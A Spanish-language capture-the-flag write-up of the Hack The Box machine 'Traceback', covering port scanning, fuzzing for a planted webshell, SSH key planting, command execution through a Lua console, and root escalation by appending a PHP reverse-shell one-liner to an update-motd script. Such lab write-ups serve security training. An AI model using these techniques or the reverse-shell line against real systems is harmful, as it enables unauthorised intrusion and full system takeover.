---

layout: single
title: Traceback- Hack The Box
excerpt: "Traceback es una máquina Linux de dificultad fácil en la cual en la fase inicial vamos a interactuar con una webshell llamada smevk.php, en la cual debemos crear un par de llaves ssh para tener permisos en el sistema y luego, interactuar con una consola en LUA para obtener la flag del usuario. En la fase de escalamiento de privilegios, vamos a revisar los procesos que están corriendo en segundo plano y configurar uno de estos procesos para agregar una shell reversa en el código y así, tener acceso como root."
date: 2020-08-15
classes: wide
header:
  teaser: /assets/images/hack-the-box/traceback_logo.png
  teaser_home_page: true
  icon: /assets/images/hack-the-box/hackthebox.webp
categories:
  - Hack-The-Box
  - Pentesting
tags:
  - Webshell
  - SSH
  - Lua
  - Pspy
---

<p align="center">
<img src="/assets/images/hack-the-box/traceback_logo.png">
</p>


Traceback es una máquina Linux de dificultad fácil en la cual en la fase inicial vamos a interactuar con una webshell llamada smevk.php, en la cual debemos crear un par de llaves ssh para tener permisos en el sistema y luego, interactuar con una consola en LUA para obtener la flag del usuario. En la fase de escalamiento de privilegios, vamos a revisar los procesos que están corriendo en segundo plano y configurar uno de estos procesos para agregar una shell reversa en el código y así, tener acceso como root.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 sauna.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n traceback.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```console
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Sauna]           
└──╼ $nmap -p- --open -T5 -v -n traceback.htb -oG all-ports                
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 11:53 EDT

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p22,80 traceback.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```console
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Sauna]           
└──╼ $nmap -sC -sV -p80,135,139,389,445 sauna.htb -oN targeted.txt   
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 11:56 EDT

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Algunos de los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 22 (SSH Secure Shell):` sirve para acceder de manera remota a máquinas de manera segura
- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.

### Enumeración HTTP

Revisando el código fuente de la página web, encontramos lo siguiente

```html
<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>
```

Buscamos `Some of the best web shells that you might need ;)` y encontramos un repositorio de [GitHub](https://github.com/TheBinitGhimire/Web-Shells) con diferentes nombre de web shells. Creamos un diccionario con todos los nombres que encontramos allí 

```
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php
```

Usamos la herramienta wfuzz para encontrar recursos no vinculados en aplicaciones web mediante fuerza bruta y encontramos que la página `smevk.php` dentro del dominio se encuentra disponible

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Traceback]
└──╼ #wfuzz -c --hc 404 -t 500 -w nombres-webshells.txt http://10.10.10.181/FUZZ                                                                                         
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************
                                 
Target: http://10.10.10.181/FUZZ
Total requests: 16
=================================================================== 
ID           Response   Lines    Word     Chars       Payload 
=================================================================== 
000000015:   200        58 L     100 W    1261 Ch     "smevk.php"
```




## Explotación

Nos dirigimos a `http://traceback.htb/smevk.php` y hay un disponible una página de login. Para las credenciales, nombre del usuario y contraseña, vamos al código fuente de la webshell [smevk.php](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php)

```php
$UserName = "admin";                                      
$auth_pass = "admin";                                  
```

Una vez ingresemos al sistema, encontramos un panel interactivo en el cual podemos revisar los archivos y directorios.

En el directorio `/home/webadmin` encontramos una carpeta llamada `.ssh` que tiene permisos para lectura y escritura. Así que vamos a generar un par de llaves SSH con el siguiente comando

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Traceback]
└──╼ #ssh-keygen -t rsa -f ssh-keys
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again:
The key fingerprint is:
SHA256:C6q88E5F8SemBH1cVGq9zoZWMJiTZmJ3TRQg0OO2Jh0 root@parrot
The key randomart image is:
+---[RSA 3072]----+
|  ..o+.o++=.     |
|   ..o== =       |
|    =o%.B o      |
|   + BE* o .     |
|    oo.oS o      |
|   ...+. *       |
|. . .o  + +      |
| = .   . .       |
| .*.             |
+----[SHA256]-----+
```

Ahora, vamos a subir la llave pública que acabamos de generar al sistema, mediante la opción de cargar archivos en la carpeta `/home/webadmin/.ssh` y luego movemos el archivo a la carpeta `authorized_keys` con el siguiente comando

```bash
mv ssh-keys.pub authorized_keys
```

Nos conectamos por SSH a la máquina  usando nuestra llave privada

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Traceback]
└──╼ #ssh -i ssh-keys webadmin@10.10.10.181

#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
Enter passphrase for key 'ssh-keys': 

Welcome to Xh4H land 

Last login: Thu Feb 27 06:29:02 2020 from 10.10.14.3
webadmin@traceback:~$ pwd /home/webadmin
```

Escribimos el comando sudo -l verificar los privilegios del usuario y encontramos que podemos ejecutar un comando como usuario `sysadmin` sin necesidad de tener la contraseña 

```bash
webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

Escribimos el comando anterior y nos aparece una consola como la siguiente

```bash
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> 
```

Nos abre una consola LUA y consultando sobre cómo ejecutar comando del sistema operativo encontramos que el comando [os.execute("")](http://lua-users.org/wiki/OsLibraryTutorial ) de la biblioteca os de LUA, muy similar a Python. De esta manera, ya obtendremos la flag de usuario

```bash
Welcome to the Luvit repl!
> os.execute("cat /home/sysadmin/user.txt")
3718d6...........................
true    'exit'  0
```




## Escalamiento de privilegios

Descargamos y luego transferimos a la máquina la herramienta [pspy](https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64) que nos sirve para revisar los procesos y tareas que están ejecutando en segundo plano.

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Traceback]
└──╼ #wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64
--2020-06-04--  https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Traceback]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.181 - - [04/Jun/2020 19:29:08] "GET /pspy64 HTTP/1.1" 200 -

webadmin@traceback:~$ wget http://10.10.14.21/pspy64
--2020-06-04 17:30:03--  http://10.10.14.21/pspy64
Connecting to 10.10.14.21:80... connected.
```

Damos permisos de ejecución al archivo `pspy64` 

```bash
webadmin@traceback:~$ chmod +x pspy64
```

Ejecutamos el script `pspy64` desde el usuario de sysadmin, para lo cual debemos ejecutar el siguiente comando de la consola de LUA 

```bash
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit                           
Welcome to the Luvit repl!          
> os.execute("./pspy64")                                                                                                               
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events 
```

Revisando la herramienta `pspy64` observamos que hay un archivo en `/etc/update-motd.d/` que se ejecuta de manera recurrente. 

```bash
2020/06/04 17:40:31 CMD: UID=0    PID=2099   | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/
```

Al igual que hicimos con el usuario webadmin, vamos a poner la llave ssh en el directorio de llaves autorizadas del usuario sysadmin mediante el siguiente comando

```bash
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("echo '<llave-rsa>' > /home/sysadmin/.ssh/authorized_keys") 
true    'exit'  0
```

Nos conectamos por SSH con el usuario `sysadmin`

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Traceback]
└──╼ #ssh -i ssh-keys sysadmin@traceback.htb

#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
Enter passphrase for key 'ssh-keys': 

Welcome to Xh4H land 

Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
$ whoami
sysadmin
```

Antes de modificar el archivo `00-header`para escalar privilegios, creamos una sesión con netcat en el puerto 4444 

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Traceback]
└──╼ #nc -lvp 444

listening on [any] 4444 ...
```

Vamos a la carpeta `/etc/update-motd.d/` y modificamos el archivo `00-header` en el cual vamos a incluir una shell reversa en PHP al final del archivo.

```bash
...
[ -r /etc/lsb-release ] && . /etc/lsb-release

echo "\nWelcome to Xh4H land \n" 
php -r '$sock=fsockopen("10.10.14.21",4444);exec("/bin/sh -i <&3 >&3 2>&3");' 
```

Rápidamente nos conectamos de nuevo por SSH al usuario `sysadmin`

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Traceback]
└──╼ #ssh -i ssh-keys sysadmin@traceback.htb

#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
Enter passphrase for key 'ssh-keys':
```

Finalmente, revisamos la sesión con netcat y ya tenemos acceso como `root`, así que lo único que nos queda es imprimir la flag

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Traceback]
└──╼ #nc -lvp 444

listening on [any] 4444 ...
connect to [10.10.14.21] from traceback.htb [10.10.10.181] 43624
/bin/sh: 0: can access tty; job control turned off
# whoami
root
# cat /root/root.txt
3ac2e9...........................
```